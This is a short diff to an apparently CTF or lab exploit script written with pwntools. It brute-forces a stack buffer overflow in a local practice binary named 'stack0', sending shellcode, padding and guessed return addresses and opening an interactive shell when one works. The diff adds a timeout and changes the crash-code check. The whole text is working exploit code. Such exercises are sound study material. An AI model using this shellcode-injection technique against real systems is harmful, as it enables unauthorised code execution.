@@ -7,14 +7,17 @@ i=0
 while (k):
 	try:
 		print hex(0xffffd000+i)
-		r=process("./stack0",aslr=False)
+		r=process("./stack0",aslr=False,alarm=1)
 		r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffd000+i))
 		p=r.poll(True)
 		print p
-		if (p!=-4 or p!=-11):
+		if (p!=-14):
 			r.kill()
 			i=i+1
 		else:
+			r.kill()
+			r=process("./stack0",aslr=False)
+			r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffd000+i))
 			r.interactive()
 			k=False
 	except EOFError as e:
